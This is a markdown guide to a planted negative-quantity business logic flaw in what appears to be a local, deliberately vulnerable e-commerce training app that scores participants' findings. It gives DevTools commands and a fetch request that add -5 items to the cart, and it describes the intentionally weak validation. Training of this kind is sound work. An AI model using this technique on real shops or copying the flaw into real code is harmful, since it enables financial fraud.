# ✅ Business Logic Bypass - Negative Quantity Purchase

## 🎯 **Vulnerability Overview**
- **Type**: Business Logic Bypass
- **Points**: 85
- **Severity**: Medium
- **What it does**: Allows purchasing items with negative quantities, effectively crediting money to the user's account

## 🧪 **Testing Methods**

### **Method 1: DevTools Console (Automated)**
1. Go to any product page: http://localhost:8084 (click on any product)
2. Open DevTools (F12) → Console
3. Run the automated test:
```javascript
// Automated test - finds and exploits the vulnerability
await window.testNegativeQuantity()
```

### **Method 2: DevTools Console (Manual Setup)**
1. Go to any product page: http://localhost:8084 (click on any product)
2. Open DevTools (F12) → Console  
3. Set up the test environment:
```javascript
// Makes the quantity input visible and modifiable
window.setupNegativeQuantityTest()
```
4. Manually set quantity to -5 in the now-visible input field
5. Click "Add to Cart"

### **Method 3: DevTools Manual (As Per Requirements)**
1. Navigate to any product page
2. Open Browser DevTools → Console
3. Run these exact commands:
```javascript
// Modify the quantity input to accept negative values
document.querySelector('input[name="quantity"]').setAttribute('min', '-999');
document.querySelector('input[name="quantity"]').value = '-5';

// Then click Add to Cart button manually
```
4. Click the "Add to Cart" button
5. Watch for the bug notification!

### **Method 4: Direct API Testing**
```javascript
// Direct API call with negative quantity
fetch('/api/cart/add/', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('access_token')
  },
  body: JSON.stringify({
    product_id: 1,
    quantity: -5
  })
})
.then(res => res.json())
.then(data => {
  console.log('Response:', data);
  if(data.bug_found) {
    console.log('🎉 BUG FOUND!', data);
  }
});
```

## 🎯 **Expected Results**

### **Success Response:**
```json
{
  "bug_found": "BUSINESS_LOGIC_BYPASS",
  "message": "🎉 Business logic bypass - negative quantity detected!",
  "description": "Negative quantity purchase attempt: -5 items",
  "points": 85,
  "vulnerability_type": "Business Logic Bypass",
  "severity": "Medium",
  "quantity": -5
}
```

### **UI Indicators:**
- ✅ Bug notification appears in the top-right corner
- ✅ Console shows "🎉 BUG FOUND!" message
- ✅ 85 points awarded to leaderboard
- ✅ Toast notification appears (error style for bug detection)

## 🔧 **Technical Implementation**

### **Backend Detection:**
- **Location**: `/api/cart/add/` endpoint
- **Detection Logic**: Checks for negative quantity BEFORE validation
- **Bypass Point**: DRF serializer validation normally prevents negative values
- **Vulnerability**: Raw request data checked before serializer validation

### **Frontend Integration:**
- **Hidden Input**: `input[name="quantity"]` exists but is hidden
- **DevTools Manipulation**: Can be made visible and modified
- **API Integration**: Direct API call with quantity value
- **Notification System**: Integrated with existing bug notification system

## 🛡️ **Normal Functionality Protected**
- ✅ Positive quantities work normally
- ✅ Cart operations unaffected for valid values
- ✅ Checkout process preserved
- ✅ Stock validation still works
- ✅ User authentication required
- ✅ Other product features unchanged

## 🎯 **Participant Discovery Process**

1. **Product Page Navigation**: User browses products normally
2. **DevTools Exploration**: Opens DevTools to inspect page
3. **Input Discovery**: Finds hidden quantity input via inspector
4. **Manipulation**: Modifies min attribute and sets negative value
5. **Exploitation**: Clicks Add to Cart with negative quantity
6. **Bug Detection**: System detects bypass and awards points

## 🔍 **Why This is a Real Vulnerability**

In real e-commerce applications, this type of business logic bypass can:
- **Credit user accounts** with money (negative cost)
- **Manipulate inventory** in unexpected ways
- **Break financial calculations** in order processing
- **Cause accounting issues** in backend systems
- **Enable financial fraud** through quantity manipulation

## ✅ **Implementation Status**
- ✅ Backend vulnerability detection working
- ✅ Frontend hidden input available for manipulation  
- ✅ DevTools console commands functional
- ✅ Bug notification system integrated
- ✅ Leaderboard integration complete
- ✅ Normal e-commerce flow preserved
- ✅ Ready for participant testing

**Test Command Summary:**
```javascript
// Quick test (automated)
await window.testNegativeQuantity()

// Manual setup
window.setupNegativeQuantityTest()

// Original DevTools approach
document.querySelector('input[name="quantity"]').setAttribute('min', '-999');
document.querySelector('input[name="quantity"]').value = '-5';
// Then click Add to Cart
```
